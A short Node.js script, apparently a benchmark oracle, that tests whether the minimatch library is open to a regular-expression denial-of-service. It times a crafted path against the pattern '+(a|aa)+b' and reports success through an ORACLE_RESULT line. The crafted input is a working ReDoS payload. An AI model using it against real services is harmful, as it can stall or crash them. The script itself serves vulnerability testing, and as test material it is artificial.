const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function nowMs() {
  return Number(process.hrtime.bigint() / 1000000n);
}

function runMany(fn, rounds) {
  const start = nowMs();
  for (let i = 0; i < rounds; i++) fn();
  return nowMs() - start;
}

function emit() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  }));
}

try {
  const benign = minimatch('abc.txt', '*.txt');
  if (benign !== true) throw new Error('benign_call_failed');

  operation_completed = true;

  const attackPath = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!';
  const attackPattern = '+(a|aa)+b';
  const controlPattern = 'a*b';

  // warm-up
  minimatch(attackPath, attackPattern);
  minimatch(attackPath, controlPattern);

  const rounds = 140;
  const tControl = runMany(() => minimatch(attackPath, controlPattern), rounds);
  const tAttack = runMany(() => minimatch(attackPath, attackPattern), rounds);

  const ratio = tControl > 0 ? (tAttack / tControl) : (tAttack > 0 ? 9999 : 1);
  const delta = tAttack - tControl;

  if (delta >= 1500 && ratio >= 20) {
    exploit_succeeded = true;
    evidence = 'redos_slowdown_detected:control_ms=' + tControl + ',attack_ms=' + tAttack + ',ratio=' + ratio.toFixed(2) + ',delta_ms=' + delta + ',rounds=' + rounds;
  } else {
    exploit_succeeded = false;
    evidence = 'no_material_slowdown:control_ms=' + tControl + ',attack_ms=' + tAttack + ',ratio=' + ratio.toFixed(2) + ',delta_ms=' + delta + ',rounds=' + rounds;
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failure:' + ((err && err.message) ? err.message : String(err));
}

emit();